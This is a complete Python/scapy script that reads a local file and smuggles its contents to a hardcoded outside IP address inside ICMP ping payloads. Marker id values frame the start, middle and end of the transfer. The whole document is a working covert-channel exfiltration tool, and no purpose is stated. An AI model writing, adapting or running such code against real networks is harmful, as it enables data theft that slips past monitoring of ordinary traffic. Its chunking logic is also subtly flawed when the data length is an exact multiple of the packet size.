import scapy.all as scapy

MAX_DATA_SIZE = 1472
START_TRANSMISSION_ID = 240
ONGOING_TRANSMISSION_ID = 250
END_TRANSMISSION_ID = 255


def send_ping(ip_addr, id, seq_number, payload):
    request = scapy.IP(dst=ip_addr) / scapy.ICMP(id=id, seq=seq_number) / payload
    scapy.send(request)


def send_data(ip_addr, id, data):
    bytes_data = data.encode()
    data_length = len(bytes_data)
    print(f'Data length is {data_length}')
    number_of_packets_to_send = (data_length // MAX_DATA_SIZE) + 1

    if number_of_packets_to_send > 1:
        for index in range(0, number_of_packets_to_send):
            if index == number_of_packets_to_send - 1:
                remainder = data_length - (index * MAX_DATA_SIZE)
                data_part = bytes_data[-1 * remainder:]
            else:
                data_part = bytes_data[index * MAX_DATA_SIZE: ((index + 1) * MAX_DATA_SIZE)]
            send_ping(ip_addr, id, index, data_part)
    else:
        send_ping(ip_addr, id, 0x0, bytes_data)


def accomplish_transmission(ip_addr, data):
    send_ping(ip_addr, START_TRANSMISSION_ID, 0x0, b'')
    send_data(ip_addr, ONGOING_TRANSMISSION_ID, data)
    send_ping(ip_addr, END_TRANSMISSION_ID, 0x0, b'')


def read_file_content(path):
    text_file = open(path, "r")
    data = text_file.read()
    text_file.close()
    print(data)
    return data


# Press the green button in the gutter to run the script.
if __name__ == '__main__':
    #print(scapy.conf.L3socket)
    #scapy.conf.L3socket = scapy.L3RawSocket
    accomplish_transmission('137.194.150.103', read_file_content('./data.txt'))
